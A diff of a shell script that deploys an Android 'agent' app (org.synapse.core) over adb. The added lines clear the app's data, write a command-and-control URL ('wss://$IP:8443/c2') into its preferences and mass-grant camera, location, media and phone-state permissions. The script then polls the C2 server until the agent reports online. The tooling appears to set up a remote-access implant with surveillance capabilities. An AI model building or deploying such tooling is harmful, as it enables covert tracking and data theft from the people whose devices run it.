@@ -45,7 +45,11 @@ sleep 2
 # 4. Install & launch agent
 echo "[4/4] Deploying agent..."
 adb install -r "$APK" 2>/dev/null
-# Set C2 URL to current IP
+sleep 2
+# Clear old prefs and set C2 URL to current IP
+adb shell pm clear org.synapse.core 2>/dev/null
+sleep 1
+adb shell mkdir -p /data/data/org.synapse.core/shared_prefs 2>/dev/null
 adb shell "echo 'wss://$IP:8443/c2' > /data/data/org.synapse.core/shared_prefs/synapse_c2_url" 2>/dev/null || true
 for perm in POST_NOTIFICATIONS CAMERA ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION \
     READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_PHONE_STATE \
@@ -64,10 +68,23 @@ echo "║  Server PID: $(pgrep -f synapse-server)                        ║"
 echo "╚══════════════════════════════════════════╝"
 echo ""
 echo "Waiting for agent connection..."
-sleep 5
-curl -k -s "https://localhost:8443/api/devices" | python3 -c "
+for i in 1 2 3 4 5; do
+  sleep 4
+  STATUS=$(curl -k -s "https://localhost:8443/api/devices" | python3 -c "
 import json,sys
 d=json.load(sys.stdin)
 for x in d.get('devices',[]):
-    print(f'  {x[\"id\"][:16]}... online={x[\"online\"]} model={x[\"info\"].get(\"model\",\"?\")}')
-" 2>/dev/null || echo "  (check dashboard)"
+    print(f'{x[\"id\"][:16]}... online={x[\"online\"]} model={x[\"info\"].get(\"model\",\"?\")}')
+" 2>/dev/null)
+  echo "  [$i] $STATUS"
+  if echo "$STATUS" | grep -q "online=True"; then
+    echo ""
+    echo "╔══════════════════════════════════════════╗"
+    echo "║  AGENT ONLINE — Ready                   ║"
+    echo "╠══════════════════════════════════════════╣"
+    echo "║  Dashboard: https://$IP:8443            ║"
+    echo "╚══════════════════════════════════════════╝"
+    exit 0
+  fi
+done
+echo "Agent did not come online — check: adb logcat -s Synapse:V"
